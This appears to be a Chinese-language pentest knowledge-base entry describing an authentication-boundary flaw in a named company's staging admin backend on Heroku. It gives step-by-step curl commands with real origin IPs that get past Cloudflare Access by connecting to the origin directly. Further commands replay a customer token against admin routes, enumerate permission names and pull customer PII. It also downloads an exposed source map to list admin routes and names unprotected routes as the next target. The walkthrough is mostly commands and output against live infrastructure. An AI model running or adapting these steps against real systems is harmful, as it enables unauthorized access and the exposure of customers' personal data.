# Fanatical adminstaging：顾客会话被后台认证中间件接受（跨 app 认证边界失效）

## 一句话
staging 顾客 app（`apistaging` / Heroku `fan-api-staging`）签发的**顾客**会话令牌，被 staging 后台
（`adminstaging` / Heroku `fan-api-staging-admin`）的认证中间件当作**已认证主体**接受：
无凭据/伪造 token = `401 User not authenticated`；真实顾客 token = `403 User not permitted to <permission>`
并回显 user id。同一主机还用该 token 200 返回完整顾客对象。

## 原理
- 两个 Heroku app 共用同一套 staging 会话存储与签名密钥（同一 staging 用户库）。
- 后台认证中间件只验「会话是否存在/有效」，**没有把 token 的签发来源应用与主体角色绑定到 admin 域**。
- 于是 role=customer 的主体通过认证层（Authentication OK），只被路由级 RBAC（Authorization）拒绝。
- 因此 401→403 的状态跃迁本身就是缺陷证据；403 报文体把内部权限名逐端点吐出来。

## 影响
1. **认证边界失效**：任意 staging 顾客（Fandom 开放注册即可取得）都是后台的「已认证主体」。
2. **RBAC 权限面泄露**：逐端点 403 回显 `User not permitted to <permission>` + `user` id，可离线拼出完整权限清单/角色矩阵。
3. **顾客 PII**：同主机 `GET /api/user/refresh-auth` 携该 token → 200 完整顾客对象（`_id`/`email`/`role`/`billing`/`dob`）。
4. **上限**：逐路由 RBAC 完好，未取得 admin 数据；但**任何漏绑权限的 admin 路由对该主体等于完全开放**。

## 前置条件
- 能直连公网 443，且能绕过 Cloudflare Zero Trust Access 直达 Heroku 源站（见 kb 509）：
  `adminstaging.fanatical.com -> fan-api-staging-admin.herokudns.com`，
  GA 源站 IP 例：`3.33.240.98 / 13.248.132.84 / 76.223.120.82 / 166.117.102.95`（会变，现取）。
- 一个真实 **staging** 顾客会话令牌（apistaging 经 Fandom SSO 签发），格式 `<24hex>.<uuid>`。
- `curl` 必须加 `--noproxy '*'`，否则本机代理自行解析 DNS，`--resolve` 失效、请求又回到 Cloudflare。

## 步骤与回显

### 0) 基线：经 Cloudflare 被 Access 拦截（对照）
```bash
curl -sk -D - --max-time 20 https://adminstaging.fanatical.com/
# HTTP/2 302
# location: https://fanatical.cloudflareaccess.com/cdn-cgi/access/login/adminstaging.fanatical.com?kid=...&meta=...
# server: cloudflare, cf-ray: <...>
```

### 1) 绕边缘：TCP 直连源站 + 正确 Host
```bash
IP=3.33.240.98   # nslookup -type=A adminstaging.fanatical.com.herokudns.com 1.1.1.1 现取
curl -sk --noproxy '*' -D - --resolve adminstaging.fanatical.com:443:$IP https://adminstaging.fanatical.com/
# HTTP/2 200, server: Heroku, via: 2.0 heroku-router, content-length: 5013
# <title>Admin | Fanatical</title>, window.SENTRY_ENVIRONMENT='fan-api-staging-admin'
# 无 cf-ray、无 Access 跳转
# 可复现性：herokudns 返回的 4 个 GA IP 逐一 200 / 5013
```

### 2) 认证层判据：401 → 403 跃迁
```bash
BASE=https://adminstaging.fanatical.com

# 2.1 无凭据 —— 401「没有有效会话」
curl -sk --noproxy '*' --resolve adminstaging.fanatical.com:443:$IP $BASE/api/admin/users
# HTTP/2 401 {"code":401,"error":"User not authenticated"}

# 2.2 伪造 token —— 同一 401 文案（说明 401 只代表 token 无效，不区分「缺头/坏 token」）
curl -sk --noproxy '*' --resolve adminstaging.fanatical.com:443:$IP \
  -H "Authorization: Bearer deadbeefdeadbeefdeadbeef.<uuid>" $BASE/api/admin/users
# HTTP/2 401 {"code":401,"error":"User not authenticated"}

# 2.3 真实 staging 顾客 token —— 403「已认证但无该权限」= 缺陷成立
curl -sk --noproxy '*' --resolve adminstaging.fanatical.com:443:$IP \
  -H "Authorization: Bearer <REDACTED_TOKEN>" $BASE/api/admin/users
# HTTP/2 403 {"code":403,"error":"User not permitted to user:view","user":"<USER_ID>"}
```
> token 契约：`Authorization: <token>` 原值与 `Bearer <token>` 均被接受；
> `/bull-api/*` 走 `Cookie: AdminAuth=<token>`。

### 3) 逐端点枚举 RBAC 权限名（每个 403 报文带一条权限）
```bash
for p in \
  /api/admin/users \
  /api/admin/users/admins \
  /api/admin/users/generate-admin-login-token/1 \
  /api/admin/serials/export \
  /api/admin/heroku-scripts \
  /api/admin/previews/carousel \
  /api/admin/image/upload ; do
  printf '%s -> ' "$p"
  curl -sk --noproxy '*' --resolve adminstaging.fanatical.com:443:$IP \
    -H "Authorization: Bearer <REDACTED_TOKEN>" "$BASE$p"; echo
done
```
已观测映射（同一 token、role=customer）：

| 路径 | 回显权限名 |
|---|---|
| `/api/admin/users` | `user:view` |
| `/api/admin/users/admins` | `misc:rbac-audit` |
| `/api/admin/users/generate-admin-login-token/{id}` | `user:log-in-as` |
| `/api/admin/serials/export` | `serial:count` |
| `/api/admin/heroku-scripts` | `heroku-script:view` |
| `/api/admin/previews/carousel` | `advert:view` |
| `/api/admin/image/upload` | `image:upload` |
| `/bull-api/api/queues`（Cookie: AdminAuth） | `misc:queues` |

### 4) 同主机顾客数据面：200 完整顾客对象
```bash
curl -sk --noproxy '*' --resolve adminstaging.fanatical.com:443:$IP \
  -H "Authorization: Bearer <REDACTED_TOKEN>" $BASE/api/user/refresh-auth
# HTTP/2 200, 917 bytes
# {"_id":"<USER_ID>","email":"<REDACTED_EMAIL>","role":"customer",
#  "billing":{"address1":"<REDACTED>"},"dob":"<REDACTED>", ...}
# 同 token 在 apistaging.fanatical.com 返回同一对象 → 共享 staging 用户库/会话存储
```

### 5) 接口面测绘（可选，配合源码 map）
```bash
curl -sk --noproxy '*' --resolve adminstaging.fanatical.com:443:$IP -o app.js.map \
  $BASE/dist/app.d13b4509.js.map      # 200, 35910 bytes（source map 非预期公开）
grep -oE '/api/admin/[a-zA-Z0-9_/-]+' app.js.map | sort -u   # ≈120 条 /api/admin/*
```

### 6) 隔离边界对照（必做，防止误判为生产问题）
```bash
TOK=<REDACTED_TOKEN>
# 生产后台（源站直连 GA）
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45 \
  -H "Authorization: Bearer $TOK" https://admin.fanatical.com/api/admin/users      # 401
# 生产数据面
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -H "Host: ws15.fanatical.com" -H "Authorization: Bearer $TOK" \
  https://ws15.fanatical.com/api/user/orders                                        # 401
# apitesting / apiprelive 同 token 打 /api/user/orders                             # 401
```
→ 说明会话信任仅限 staging 侧，**不能平移到生产**（详见 kb 711）。

## 判据汇总
- **命中**：无凭据 401「User not authenticated」→ 同一 URL 携真实 staging 顾客 token 变 403
  `User not permitted to <perm>` 且带 `user` 字段。401→403 的跃迁 = 认证通过、鉴权拒绝。
- **未命中**：真 token 仍 401 → 不是 staging 会话 / 已过期 / 请求落回 Cloudflare。
- **假阳性**：200 + 5013B HTML = SPA 回落（未知非 GET 路径），不是数据。

## 失败常见原因
- 漏 `--noproxy '*'`：代理重解析 DNS，`--resolve` 失效，回到 Cloudflare Access（302）。
- 用的是**生产** token（apiprelive/apitesting 签发）：staging 后台不认，恒定 401。
- GA 源站 IP 轮换，旧 IP 失效 → 重新 `nslookup -type=A <域>.herokudns.com 1.1.1.1`。
- 期望直接拿 admin 数据：本缺陷只到「已认证」，RBAC 逐路由完好
  （路径大小写/尾斜杠/编码/点段/`..;/`/override/rewrite/IP 伪造/permission 注入矩阵已系统性阴性，见 kb 715）。
- 真正要打的是**漏绑 RBAC 的路由**：用第 5 步的 120~248 条 `/api/admin/*` 清单逐条比对
  「该路由是否回 403 权限名」；任何直接 200 的即命中。

## 脱敏说明
真实 token、user id、顾客邮箱、账单地址、生日均已替换为 `<REDACTED_*>`；复现需自备一个 staging 顾客会话。

## 关联条目
- kb 509：Heroku 源站直连绕 Cloudflare Access/WAF（本缺陷的第 0/1 步，必读）
- kb 711：staging 顾客会话跨环境打**生产**证否（阴性，隔离边界）
- kb 715：adminstaging `/api/admin/*` 路径/头绕过矩阵阴性（533 次）
- kb 700：apistaging `/api/user/*` 角色自更新提权证否
- kb 737：prelive 会话被生产接受的跨环境信任（对照：那条是 prelive→生产）
- kb 681：生产 admin JWT 面系统性证否（5,199 候选密钥）